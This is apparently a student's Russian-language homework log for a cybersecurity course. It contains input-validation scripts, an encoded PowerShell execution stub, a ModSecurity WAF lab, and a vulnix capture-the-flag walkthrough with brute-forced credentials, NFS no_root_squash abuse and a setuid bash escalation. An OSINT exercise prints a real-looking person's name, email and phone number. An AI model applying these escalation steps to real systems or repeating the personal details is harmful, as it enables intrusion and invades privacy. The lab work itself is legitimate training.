    if not re.match(r'^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};:\'",.<>?]+$', password):
        errors.append("Пароль должен содержать только английские буквы, цифры и специальные символы")
    
    # Проверка на наличие хотя бы одной строчной буквы
    if not re.search(r'[a-z]', password):
        errors.append("Пароль должен содержать хотя бы одну строчную букву")
    
    # Проверка на наличие хотя бы одной заглавной буквы
    if not re.search(r'[A-Z]', password):
        errors.append("Пароль должен содержать хотя бы одну заглавную букву")
    
    # Проверка на наличие хотя бы одной цифры
    if not re.search(r'\d', password):
        errors.append("Пароль должен содержать хотя бы одну цифру")
    
    # Проверка на наличие хотя бы одного специального символа
    if not re.search(r'[!@#$%^&*()_+\-=\[\]{};:\'",.<>?]', password):
        errors.append("Пароль должен содержать хотя бы один специальный символ")
    
    return errors

# Пример использования
passwords = [
    "abcABC123!@#",  # Правильный пароль
    "short",         # Слишком короткий
    "nouppercase123!",  # Нет заглавной буквы
    "NOLOWERCASE123!",  # Нет строчной буквы
    "NoDigits!@#",   # Нет цифры
    "NoSpecialChar123",  # Нет специального символа
    "ValidPassword123!",  # Правильный пароль
    "русскиеБуквы123!", # Содержит не английские буквы
]

for password in passwords:
    errors = check_password(password)
    if not errors:
        print(f"{GREEN}Пароль '{password}' соответствует всем требованиям.{RESET}")
    else:
        print(f"{RED}Пароль '{password}' не соответствует следующим требованиям:{RESET}")
        for error in errors:
            print(f"{PURPLE}- {error}{RESET}")
    print()  # Пустая строка для разделения результатов

```

Python скрипт для проверки пароля с интерактивным вводом

[Password_check_2](/Lesson_29/password_check2.py)

```python

import re




def check_password(password):
    errors = []

    # Проверка длины пароля
    if not 12 <= len(password) <= 24:
        errors.append("Длина пароля должна быть от 12 до 24 символов")
    
    # Проверка на наличие только английских букв, цифр и символов
    if not re.match(r'^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};:\'",.<>?]+$', password):
        errors.append("Пароль должен содержать только английские буквы, цифры и специальные символы")
    
    # Проверка на наличие хотя бы одной строчной буквы
    if not re.search(r'[a-z]', password):
        errors.append("Пароль должен содержать хотя бы одну строчную букву")
    
    # Проверка на наличие хотя бы одной заглавной буквы
    if not re.search(r'[A-Z]', password):
        errors.append("Пароль должен содержать хотя бы одну заглавную букву")
    
    # Проверка на наличие хотя бы одной цифры
    if not re.search(r'\d', password):
        errors.append("Пароль должен содержать хотя бы одну цифру")
    
    # Проверка на наличие хотя бы одного специального символа
    if not re.search(r'[!@#$%^&*()_+\-=\[\]{};:\'",.<>?]', password):
        errors.append("Пароль должен содержать хотя бы один специальный символ")
    
    return errors

def main():

    GREEN="\033[32m"
    PURPLE="\033[35m"
    RED="\033[31m"
    BLUE="\033[34m"
    RESET="\033[0m"

    print(f"{BLUE}Программа проверки пароля{RESET}\n\n")
    print(f"{BLUE}Требования к паролю:{RESET}\n")
    print(f"{BLUE}- Длина от 12 до 24 символов{RESET}")
    print(f"{BLUE}- Только английские буквы, цифры и специальные символы{RESET}")
    print(f"{BLUE}- Минимум 1 строчная буква, 1 заглавная буква, 1 цифра и 1 специальный символ{RESET}\n\n")


    while True:
        password = input(f"Введите пароль для проверки (или {RED}'exit'{RESET} для завершения): ")
        
        if password.lower() == 'exit':
            print(f"{RED}Программа завершена.{RESET}")
            break

        errors = check_password(password)
        
        if not errors:
            print(f"{GREEN}Пароль соответствует всем требованиям!{RESET}")
        else:
            print(f"{RED}Пароль не соответствует следующим требованиям:{RESET}")
            for error in errors:
                print(f"{PURPLE}- {error}{RESET}")
        
        print()  # Пустая строка для разделения результатов

if __name__ == "__main__":
    main()

```

Bash скрипт для проверки пароля из готового списка

[Password_check_bash](/Lesson_29/bash_password_check_2.sh)

```bash

#!/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
PURPLE='\033[0;35m'
RESET='\033[0m'


check_password() {
    local password=$1
    local errors=()

    # Проверка длины пароля
    if [[ ${#password} -lt 12 || ${#password} -gt 24 ]]; then
        errors+=("Длина пароля должна быть от 12 до 24 символов")
    fi

    # Проверка на наличие только английских букв, цифр и символов
    if [[ ! $password =~ ^[a-zA-Z0-9]+$ ]]; then
        errors+=("Пароль должен содержать только английские буквы и цифры")
    fi

    # Проверка на наличие хотя бы одной строчной буквы
    if [[ ! $password =~ [a-z] ]]; then
        errors+=("Пароль должен содержать хотя бы одну строчную букву")
    fi

    # Проверка на наличие хотя бы одной заглавной буквы
    if [[ ! $password =~ [A-Z] ]]; then
        errors+=("Пароль должен содержать хотя бы одну заглавную букву")
    fi

    # Проверка на наличие хотя бы одной цифры
    if [[ ! $password =~ [0-9] ]]; then
        errors+=("Пароль должен содержать хотя бы одну цифру")
    fi

    # Возвращаем результат
    if [ ${#errors[@]} -eq 0 ]; then
        echo -e "${GREEN}Пароль '$password' соответствует всем требованиям.${RESET}"
    else
        echo -e "${RED}Пароль '$password' не соответствует следующим требованиям:${RESET}"
        for error in "${errors[@]}"; do
            echo -e "${PURPLE}- $error${RESET}"
        done
    fi
    echo
}

# Список паролей для проверки
passwords=(
    "abcefABCEF123"
    "short"
    "nouppercase123"
    "NOLOWERCASE123"
    "NoDigits"
    "WithSpecialChar123!"
    "ValidPasswordYes123"
    "русскиеБуквы123"
)

# Проверка каждого пароля
for password in "${passwords[@]}"; do
    check_password "$password"
done

```

Bash скрипт для проверки пароля с интерактивным вводом

[Password_check_bash_2](/Lesson_29/bash_password_check_3.sh)

```bash

#!/bin/bash

GREEN='\033[0;32m'
PURPLE='\033[0;35m'
RED='\033[0;31m'
BLUE='\033[0;34m'
RESET='\033[0m'


check_password() {
    local password=$1
    local errors=()

    # Проверка длины пароля
    if [[ ${#password} -lt 12 || ${#password} -gt 24 ]]; then
        errors+=("Длина пароля должна быть от 12 до 24 символов")
    fi

    # Проверка на наличие только английских букв, цифр и символов
    if [[ ! $password =~ ^[a-zA-Z0-9]+$ ]]; then
        errors+=("Пароль должен содержать только английские буквы и цифры")
    fi

    # Проверка на наличие хотя бы одной строчной буквы
    if [[ ! $password =~ [a-z] ]]; then
        errors+=("Пароль должен содержать хотя бы одну строчную букву")
    fi

    # Проверка на наличие хотя бы одной заглавной буквы
    if [[ ! $password =~ [A-Z] ]]; then
        errors+=("Пароль должен содержать хотя бы одну заглавную букву")
    fi

    # Проверка на наличие хотя бы одной цифры
    if [[ ! $password =~ [0-9] ]]; then
        errors+=("Пароль должен содержать хотя бы одну цифру")
    fi


    # Вывод ошибок
    if [ ${#errors[@]} -eq 0 ]; then
        echo -e "${GREEN}Пароль соответствует всем требованиям!${RESET}"
    else
        echo -e "${RED}Пароль не соответствует следующим требованиям:${RESET}\n"
        for error in "${errors[@]}"; do
            echo -e "${PURPLE}- $error${RESET}"
        done
    fi
}

echo -e "${BLUE}Программа проверки пароля${RESET}\n"
echo -e "${BLUE}Требования к паролю:\n${RESET}"
echo -e "${BLUE}- Длина от 12 до 24 символов${RESET}"
echo -e "${BLUE}- Только английские буквы, цифры и специальные символы${RESET}"
echo -e "${BLUE}- Минимум 1 строчная буква, 1 заглавная буква и 1 цифра${RESET}"
echo

while true; do
    read -p  "Введите пароль для проверки (или 'exit' для завершения): " password
    
    if [[ ${password,,} == "exit" ]]; then
        echo "${RED}Программа завершена.${RESET}"
        break
    fi

    check_password "$password"
    echo
done

```

Python скрипт для проверки белорусского номера телефона из готового списка

[Phone_check](/Lesson_29/phone_check.py)

```python

import re

GREEN="\033[32m"
RED="\033[31m"
RESET="\033[0m"

def validate_belarus_phone(phone_number):
    # Паттерн для белорусских номеров
    pattern = r'^(\+375|375|80)(29|25|44|33)(\d{3})(\d{2})(\d{2})$'
    
    # Удаляем все не-цифровые символы из номера
    cleaned_number = re.sub(r'\D', '', phone_number)
    
    # Проверяем соответствие паттерну
    match = re.match(pattern, cleaned_number)
    
    if match:
        return True
    else:
        return False

# Примеры использования
test_numbers = [
    '+375291234567',
    '375331234567',
    '80251234567',
    '+375 44 123 45 67',
    '8029-123-45-67',
    '+7 495 123 45 67',  # Российский номер
    '12345678'  # Неверный формат
]

for number in test_numbers:
    if validate_belarus_phone(number):
        print(f"{GREEN}{number} - действительный белорусский номер{RESET}")
    else:
        print(f"{RED}{number} - недействительный белорусский номер{RESET}")

```

Python скрипт для проверки белорусского номера телефона с интерактивным вводом

[Phone_check_2](/Lesson_29/phone_check2.py)

```python

import re

GREEN="\033[32m"
RED="\033[31m"
CYAN="\033[36m"
RESET="\033[0m"

def validate_belarus_phone(phone_number):
    # Паттерн для белорусских номеров
    pattern = r'^(\+375|375|80)(29|25|44|33)(\d{3})(\d{2})(\d{2})$'
    
    # Удаляем все не-цифровые символы из номера
    cleaned_number = re.sub(r'\D', '', phone_number)
    
    # Проверяем соответствие паттерну
    match = re.match(pattern, cleaned_number)
    
    return bool(match)

def main():
    print(f"{CYAN}Проверка белорусских телефонных номеров{RESET}\n")
    print(f"Для выхода введите {RED}'exit'{RESET}")
    
    while True:
        phone_number = input("\nВведите номер телефона для проверки: ").strip()
        if phone_number.lower() in ['exit']:
            print(f"{RED}Программа завершена.{RESET}")
            break
        
        if validate_belarus_phone(phone_number):
            print(f"{GREEN}{phone_number} - действительный белорусский номер{RESET}")
        else:
            print(f"{RED}{phone_number} - недействительный белорусский номер{RESET}")
        
        print(f"\n{CYAN}Примеры правильного формата{RESET}")
        print(f"{CYAN}+375 29 123 45 67{RESET}")
        print(f"{CYAN}80291234567{RESET}")
        print(f"{CYAN}375 33 1234567{RESET}")

if __name__ == "__main__":
    main()

```

Bash скрипт для проверки белорусского номера телефона из готового списка

[Phone_check_bash](/Lesson_29/bash_phone_check_2.sh)

```bash

#!/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
RESET='\033[0m'


validate_belarus_phone() {
    local phone_number=$1
    # Удаляем все не-цифровые символы из номера
    cleaned_number=$(echo "$phone_number" | sed 's/[^0-9]//g')
    
    # Проверяем соответствие паттерну
    if [[ $cleaned_number =~ ^(375|80)(29|25|44|33)[0-9]{7}$ ]]; then
        return 0 # Действительный номер
    else
        return 1 # Недействительный номер
    fi
}

# Список тестовых номеров
test_numbers=(
    "+375291234567"
    "375331234567"
    "8 (025) 123 45 67"
    "+375 44 123 45 67"
    "8029-123-45-67"
    "+7 495 123 45 67"
    "12345678"
)

for number in "${test_numbers[@]}"; do
    if validate_belarus_phone "$number"; then
        echo -e "${GREEN}$number - действительный белорусский номер${RESET}"
    else
        echo -e "${RED}$number - недействительный белорусский номер${RESET}"
    fi
done

```

Bash скрипт для проверки белорусского номера телефона с интерактивным вводом

[Phone_check_bash_2](/Lesson_29/bash_phone_check_3.sh)

```bash

#!/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
RESET='\033[0m'



validate_belarus_phone() {
    local phone_number=$1
    # Удаляем все не-цифровые символы из номера
    cleaned_number=$(echo "$phone_number" | sed 's/[^0-9]//g')
    
    # Проверяем соответствие паттерну
    if [[ $cleaned_number =~ ^(375|80)(29|25|44|33)[0-9]{7}$ ]]; then
        return 0 # Действительный номер
    else
        return 1 # Недействительный номер
    fi
}

echo -e "${BLUE}Проверка белорусских телефонных номеров${RESET}\n"
echo -e "Для выхода введите ${RED}'exit'${RESET}"

while true; do
    echo
    read -p "Введите номер телефона для проверки: " phone_number
    
    if [[ ${phone_number,,} == "exit" ]]; then
        echo -e "${RED}Программа завершена.${RESET}"
        break
    fi
    
    if validate_belarus_phone "$phone_number"; then
        echo -e "${GREEN}$phone_number - действительный белорусский номер${RESET}"
    else
        echo -e "${RED}$phone_number - недействительный белорусский номер${RESET}"
    fi
    
    echo
    echo -e "${BLUE}Примеры правильного формата:${RESET}"
    echo -e "${BLUE}+375 29 123 45 67${RESET}"
    echo -e "${BLUE}80291234567${RESET}"
    echo -e "${BLUE}375 33 1234567${RESET}"
done

```

Python скрипт для проверки email-адреса с интерактивным вводом

[Email_check](/Lesson_29/email_check2.py)

```python

import re
import dns.resolver
import socket

GREEN="\033[32m"
RED="\033[31m"
CYAN="\033[36m"
RESET="\033[0m"



def validate_email(email):
    # Базовый паттерн для проверки email
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    
    if not re.match(pattern, email):
        return False, "Некорректный формат email-адреса"
    
    # Проверка длины email
    if len(email) > 254:
        return False, "Email слишком длинный"
    
    # Проверка длины локальной части (до @)
    local_part = email.split('@')[0]
    if len(local_part) > 64:
        return False, "Локальная часть email слишком длинная"
    
    # Проверка на наличие последовательных точек
    if '..' in email:
        return False, "Email содержит последовательные точки"
    
    # Проверка домена
    domain = email.split('@')[1]
    try:
        # Проверка MX-записи домена
        mx_records = dns.resolver.resolve(domain, 'MX')
        if not mx_records:
            return False, "Домен не имеет MX-записей"
        
        # Проверка A-записи домена
        socket.gethostbyname(domain)
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, socket.gaierror):
        return False, "Домен не существует или недоступен"
    
    return True, "Email-адрес корректен"

def main():
    print(f"{CYAN}Проверка email-адресов{RESET}\n")
    print(f"Для выхода введите {RED}'exit'{RESET}")
    
    while True:
        email = input("\nВведите email для проверки: ").strip()
        
        if email.lower() in ['exit']:
            print(f"{RED}Программа завершена.{RESET}")
            break
        
        is_valid, message = validate_email(email)
        if is_valid:
            print(f"{email} - {GREEN}{message}{RESET}")
        else:
            print(f"{email} - {RED}некорректный email-адрес: {CYAN}{message}{RESET}")
        
        print(f"{CYAN}\nПримеры правильного формата:{RESET}")
        print(f"{CYAN}user@example.com{RESET}")
        print(f"{CYAN}name.surname@domain.co.uk{RESET}")

if __name__ == "__main__":
    main()

```

Bash скрипт для проверки email-адреса с интерактивным вводом

[Email_check_bash](/Lesson_29/bash_email_check_3.sh)

```bash

#!/bin/bash

GREEN='\033[0;32m'
CYAN='\033[0;36m' 
RED='\033[0;31m'
PURPLE='\033[0;35m'
RESET='\033[0m'


validate_email() {
    local email="$1"
    
    # Базовая проверка формата email
    if ! echo "$email" | grep -E '^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$' >/dev/null 2>&1; then
        echo "Некорректный формат email-адреса"
        return 1
    fi
    
    # Проверка длины email
    if [ ${#email} -gt 254 ]; then
        echo "Email слишком длинный"
        return 1
    fi
    
    # Проверка длины локальной части
    local local_part="${email%%@*}"
    if [ ${#local_part} -gt 64 ]; then
        echo "Локальная часть email слишком длинная"
        return 1
    fi
    
    # Проверка на последовательные точки
    if echo "$email" | grep -E '\.\.' >/dev/null 2>&1; then
        echo "Email содержит последовательные точки"
        return 1
    fi
    
    # Проверка домена
    local domain="${email#*@}"
    
    # Проверка MX-записи
    if ! dig +short MX "$domain" | grep -E '^[0-9]+ [a-zA-Z0-9.-]+\.$' >/dev/null 2>&1; then
        echo "Домен не имеет действительных MX-записей"
        return 1
    fi
    
    # Проверка A-записи
    if ! dig +short A "$domain" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' >/dev/null 2>&1; then
        echo "Домен не имеет действительных A-записей"
        return 1
    fi
    
    echo "Email-адрес корректен"
    return 0
}

main() {
    echo -e "${CYAN}Проверка email-адресов${RESET}\n"
    echo -e "${CYAN}Для выхода введите ${RED}'exit'${RESET}"
    
    while true; do
        echo
        read -p "Введите email для проверки: " email
        
        if [[ "${email,,}" == "exit" ]]; then
            echo -e "${RED}Программа завершена.${RESET}"
            break
        fi
        
        result=$(validate_email "$email")
        status=$?
        
        if [ $status -eq 0 ]; then
            echo -e "${GREEN}$email - $result${RESET}"
        else
            echo -e "$email ${RED}- некорректный email-адрес: ${PURPLE}$result${RESET}"
        fi
        
        echo
        echo -e "${CYAN}Примеры правильного формата:${RESET}"
        echo -e "${CYAN}user@example.com${RESET}"
        echo -e "${CYAN}name.surname@domain.co.uk${RESET}"
    done
}

main

```

___
> BASE64
___

```base64
JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQAgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIAB7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQAKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA=
```

![Decode_base64](/Lesson_29/ДЗ_29_1.png)


</details>


<details><summary>Занятие №30 Web Application Security </summary>

___
> Установить WAF (nginx + Modsecurity)
___

Задание выполненов в уроке № 19

Повторил на Ubuntu серверной версии.

![Normal_curl](/Lesson_30/ДЗ_30_1.png)

![Error_curl](/Lesson_30/ДЗ_30_3.png)

___
> Разверните [Готовая виртуалка Ubuntu + modesecurity](https://drive.usercontent.google.com/download?id=12tO5SwSu43IJprim8BafCmF-aQb9-EfM&export=download&authuser=0)
___

⦁	Настройте сетевой адаптер в режиме моста (Сетевой мост/Network Bridge)
⦁	Проверьте ip адрес виртуальной машины
⦁	Запустите контейнер с уязвимым приложением.
⦁	sudo docker run -d -p 8080:80 saurav7055/xvwa
⦁	Теперь приложение доступно по адресу {ip сервера}:80/xvwa по всей вашей домашней сети, если нет ограничений файервола.
⦁	Вызовите 5 различных сработок WAF Правила, применяя уязвимости в приложении
⦁	Пришлите результат сработки, правило WAF и его ID (var/log/nginx/error.log)


Выполнение:
    1. Установка Ubuntu server 22.04. Не устанавливаем из коробки сервис докер так как устанавливается устаревшая версия и потом не получится установить ключ для подключения к репозиторию докера из чего следуют проблемы с пулом образов, обновлением докера.

    2.Конфигурирем 2 интерфейса: сеть NAT (для доступа в интернет) и виртуальный адаптер хоста (для к доступа к виртуальной машине с хостовой).
    
    3. Установка modsecurity2+apache2 (устанавливается modsecurity2 так как эта версия изначально писалась для взаимодействия с apache и имеет лучшую синергию) [мануал установки](https://ruvds.com/ru/helpcenter/ustanovka-i-nastroyka-modsecurity-dlya-apache/)
    
    4. В нашем случае apache2 выступает как прокси для подключения к нашему web-приложению. Это необходимо, чтобы была возможность работы WAF.

Для настройки Apache в качестве прокси для веб-приложения, развернутого в контейнере, выполните следующие шаги:
Установите Apache и необходимые модули:

```bash
sudo apt-get install apache2
sudo a2enmod proxy proxy_http
```

Создайте новый файл конфигурации виртуального хоста:
bash
sudo nano /etc/apache2/sites-available/container-app.conf

Добавьте следующую конфигурацию в файл:
```xml
<VirtualHost *:80>
    ServerName yourdomain.com
    ProxyPreserveHost On
    ProxyPass / http://localhost:8080/
    ProxyPassReverse / http://localhost:8080/
</VirtualHost>
```

Замените "yourdomain.com" на ваш домен и "8080" на порт, на котором работает ваше приложение в контейнере.
Активируйте новый виртуальный хост:
```bash
sudo a2ensite container-app.conf
```

Перезапустите Apache:
```bash
sudo systemctl restart apache2
```

Теперь Apache будет перенаправлять входящий трафик на порт 80 к вашему контейнеризированному веб-приложению

Если у вас открывается страница Apache вместо веб-приложения из контейнера, это может быть связано с несколькими причинами:
Неправильная настройка прокси в Apache. Убедитесь, что вы правильно настроили Apache для проксирования запросов к вашему контейнеру. Проверьте конфигурацию виртуального хоста2:
```xml
<VirtualHost *:80>
    ServerName yourdomain.com
    ProxyPreserveHost On
    ProxyPass / http://localhost:8080/
    ProxyPassReverse / http://localhost:8080/
</VirtualHost>
```

Неверный порт контейнера. Удостоверьтесь, что вы правильно указали порт, на котором работает ваше приложение в контейнере. Например, если вы используете порт 8080 в контейнере, убедитесь, что вы правильно пробросили его при запуске контейнера:

```bash
docker run -d -p 8080:80 your-container-image
```

Приложение в контейнере не запущено или не работает корректно. Проверьте логи контейнера, чтобы убедиться, что ваше приложение запускается без ошибок.

Модули прокси Apache не включены. Убедитесь, что вы включили необходимые модули Apache:
```bash
sudo a2enmod proxy proxy_http
```

Неправильная конфигурация DocumentRoot в Apache. Проверьте, что DocumentRoot указывает на правильную директорию.

После внесения изменений не забудьте перезапустить Apache:
```bash
sudo systemctl restart apache2
```
Если проблема сохраняется, проверьте логи Apache и вашего контейнера для получения дополнительной информации о возможных ошибках.

    5. Запускаем контейнер с приложением на порт 8080

```bash

sudo docker run -d -p 8080:80 saurav7055/xvwa

```
[мануал для xvwa](https://github.com/tuxotron/xvwa_lamp_container)

    6. Проверяем

![normal](/Lesson_30/ДЗ_30_5.png)

![waf](/Lesson_30/ДЗ_30_4.png)

 Правила:


![waf_1](/Lesson_30/ДЗ_30_5_1.png)

![waf_2](/Lesson_30/ДЗ_30_5_2.png)

![waf_3](/Lesson_30/ДЗ_30_5_3.png)

![waf_4](/Lesson_30/ДЗ_30_5_5.png)

![waf_5](/Lesson_30/ДЗ_30_5_6.png)

</details>


<details><summary>Занятие №31-32 DevSecOps </summary>

___
> Ознакомиться с основными ресурсами по DevSecOps
___

[Уязвимости Pypi Library](https://www.opennet.ru/opennews/art.shtml?num=55565)

[Основные этапы DevSecOps](https://habr.com/ru/companies/yandex_cloud_and_infra/articles/738192/)

___
> Написать тестовый пайплайн по статье с хабра
___

[Мануал по созданию тестового пайплайна](https://spacelift.io/blog/gitlab-ci-yml)

![pipeline](/Lesson_31-32/ДЗ_31_vscode.png)

![pipeline](/Lesson_31-32/ДЗ_31_pipe2.png)

![pipeline](/Lesson_31-32/)

</details>


<details><summary>Занятие №33 Reverse Engineering </summary>

___
> Ознакомиться с основными ресурсами по Reverse Engin
___

[Active Directory Pentest Roadmap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)

[Malware bazaar](https://bazaar.abuse.ch/browse/)

___
> Проанализировать malware crackme.exe
___

[Crack_me manual](https://fatihhcelik.github.io/posts/The-First-CrackMe-of-The-Series-CrackMe1/)

![Crack_me_1](/Lesson_33/ДЗ_33_1.png)

![Crack_me_2](/Lesson_33/ДЗ_33_2.png)

[Отчет по файлу](/Lesson_33/Отчет%20по%20файлу.docx)

</details>



<details><summary>Занятие №34 OSINT</summary>

___
> Ознакомиться с основными ресурсами OSINT лекции
___

[OSINT Framework](https://osintframework.com)

[Google hacking Database](https://www.exploit-db.com/google-hacking-database)

[Guide to find anyone email](https://perma.cc/JUE9-XRJL)

___
> Найти препода в архивах социальных сетей
___

Было известно:

    github проект преподавателя

Что удалось найти:

    1. Страница LinkedIn

    2. Личный сайт

    3. Страница в твиттере

    4. Название 2-ух email

    5. Названия компаний в которых работал преподаатель

    6. Сервис https://pimeyes.com нашел связаный с преподавателем аккаунт

![Фото](/Lesson_34/ДЗ_34_1.bmp)

Трудности:

    1. Отключение доступа к кешированым страницам гугла, а также ограничения работы сервиса [web.archive.org](https://web.archive.org) (страницу должен кто-то сохранить + страница должна быть в общем доступе) никак не помогли в поиске социальных сетей 

    2. Сервис [pimeyes.com](https://pimeyes.com) оказался платным (и достаточно дорогим), чтобы продолжить поск преподавателя

___
> Произвести OSINT на организацию либо компанию с помощью theHarvester
___

[Мануал по работе с TheHarvester](https://securitytrails.com/blog/theharvester-tool)

![1](/Lesson_34/ДЗ_34_2.bmp)

![2](/Lesson_34/ДЗ_34_3.bmp)

![3](/Lesson_34/ДЗ_34_4.bmp)

![4](/Lesson_34/ДЗ_34_5.bmp)

Юркина Татьяна Ивановна
Заместитель директора по идеологической работе, персоналу и социальным вопросам
yurkina.ti@belgee.by
+375 (29) 6944470

</details>


<details><summary>Занятие №35-36 Pentest</summary>

___
> Ознакомиться с основными ресурсами Pentest лекции
___

[Словари паролей](https://github.com/danielmiessler/SecLists)

[Metasploit 2](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)

[Подбор пароля по хэшу](https://hackware.ru/?p=14217)

[Exploit DB](https://www.exploit-db.com)

[Тренировочный полигон](https://www.cobaltstrike.com)

[The Penetration Testing Execution Standard Documentation](https://readthedocs.org/projects/pentest-standard/downloads/pdf/latest/)

[The Open Source Security Testing Methodology Manual](https://www.isecom.org/OSSTMM.3.pdf)

[NIST SP 800-115 Technical Guide to Information Security Testing and Assessment](https://csrc.nist.gov/pubs/sp/800/115/final)

[OWASP Penetration Testing Methodologies](https://owasp.org/www-project-web-security-testing-guide/latest/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies)

[BSI – Study a Penetration Testing Mode](https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Publications/Studies/Penetration/penetration_pdf.pdf?__blob=publicationFile&v=1)



___
> Скачать вирутальную машину и получить флаг vulnix  *root
___

1. Запуск ВМ vulnix

    Так как образ ВМ vulnix создан на базе платформы VMWare просто так запустить образ на Virtualbox не получится. Для этого необходимо создать любую ВМ и в настройках привязать жесткий диск.

2. Самостоятельная работа

    Для получения IP-адреса ВМ vulnix был применены инструменты nmap и legion

    ![Legion_1](/Lesson_35-36/ДЗ_35_3_1.png)

    ![Legion_2](/Lesson_35-36/ДЗ_35_3_2.png)

    Были обнаружены: ssh-server, nfs-server, почтовые службы, finger.

    Также legion произвел сканирование на наличие уязвимостей. В дополнению к этому была применен эксплоит smtp для получения всех пользователей, зарегистрированных сервисом.

    ![Legion_3](/Lesson_35-36/ДЗ_35_4.png)

    ![Legion_4](/Lesson_35-36/ДЗ_35_5.png) 

    Используя список найденных уязвимостей были попытки их эксплуатации с помощью Metasploit framework. Результатов данные действия не принесли никаких, кроме опыта работы с данным фрэймворком.

    ![Metasploit](/Lesson_35-36/ДЗ_35_6.png)

    Был примонтирован nfs диск командой. По содержимому я понял, что это домашняя директория пользователя vulnix. Однако в саму директорию попасть я не смог.

    ```bash 
    sudo mkdir /tmp/nfs
    sudo mount -t nfs 54.55.56.21:/ /tmp/nfs 
    ```

    Параллельно был запущен брутфорс данной ВМ с коротким словарем пар логин/пароль и длинными. Короткий дал результаты в виде пары user/letmein. Большой все еще продалжает работу

    ![Brute](/Lesson_35-36/ДЗ_35_1.png)

    После чего используя логин User я подключился к ВМ по ssh. И посмотрел uid и gid пользователя vulnix, чтобы попасть в его домашнюю директорию через nfs диск.

    После того, как я создал пользователя (uid 2008, gid 2008) мои идеи по дальнейшему взлому закончились и я обратился к гайду.

3. Взлом по гайду

    Вот три основных гайда на которые я опирался:

    [Мануал_1](https://sevenlayers.com/index.php/107-vulnhub-vulnix-walkthrough)

    [Мануал_2](https://medium.com/@dasagreeva/hacklab-vulnix-walkthrough-ff8c6414766d)

    [Мануал_3](https://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm)

    ![Результат](/Lesson_35-36/ДЗ_35_2.png)

4. Проблемы

    Долго не мог подключится к ВМ по SSH при помощи rsa-ключа так как поменял права на доступ к домашней директории с 711 на 777 (ssh проверяет права доступа у всех директорих и самого ключа и если что-то отличается от стандартных, он выдает ошибку и блокирует подключение при помощи ключа).

    Для выполнения задания достаточно было в файле /etc/exports прописать строку /   *(rw,no_root_squash). /etc/exports является конфигурационным файлом nfs сервера и прописав такой параметр при монтировании nfs-шары мы получали бы рутовы права на всю машину.
    
    Однако я решил сделать соответственно как было показано в гайде 3 и запустить оболочку bash с правами root при подключении по ssh (то есть повысить привелегии пользователя vulnix). У меня не получилось сделать ни как в гайде 1 ни как в гайде 3, так как при попытке запустить bash либо sh выдавало ошибку о невозможности выполнения бинарного файла. У меня получилось выполнить запуск bash только при подключении корневого каталога с правами администратора и копирования /bin/bash на самой ВМ vulnix в домашнюю директорю пользователя и расширения прав запуска

    ```bash
    chmod 4777 /home/vulnix/bash
    ```

___
> Скачать dump сети и найти флаг, прислать скрин флага (пароль: teachmeskills, ищем image)
___

Чтобы найти изображения в дампе Wireshark, выполните следующие шаги:

    1.Перейдите в меню "File" → "Export Objects" → "HTTP".
    2. В открывшемся окне вы увидите список всех захваченных HTTP-объектов, включая текстовые файлы и изображения.
    3. Чтобы извлечь нужное изображение, выделите его в списке и нажмите кнопку "Save As".
    4. Выберите место на вашем компьютере, куда хотите сохранить изображение, и подтвердите сохранение.

Этот метод позволяет извлекать не только изображения, но и другие типы файлов, включая потоковое видео и аудио

 Текстовом представлении эти байты могут выглядеть как "ЇШ" или "яШ", в зависимости от используемой кодировки. В предоставленном дампе мы видим "яШяа JFIF", где "яШ" соответствует началу JPEG-файла.

Открываем выгруженный файл обязательно релдактором VI так как только он вид артефакты в виде записей /M. Если их не удалить, то картинка не сможет равильно преобразоваться и отобразиться.

![1](/Lesson_35-36/ДЗ_35.bmp)

___
> Работа с Metasploit
___

![Nmap](/Lesson_35-36/ДЗ_35_mt_1.png)

Повышение привелегий через /etc/sudoers

![Sudo-user](/Lesson_35-36/ДЗ_35_mt_2.png)

![Root](/Lesson_35-36/ДЗ_35_mt_3.png)

</details>


<details><summary>Занятие №37 CTF</summary>

___
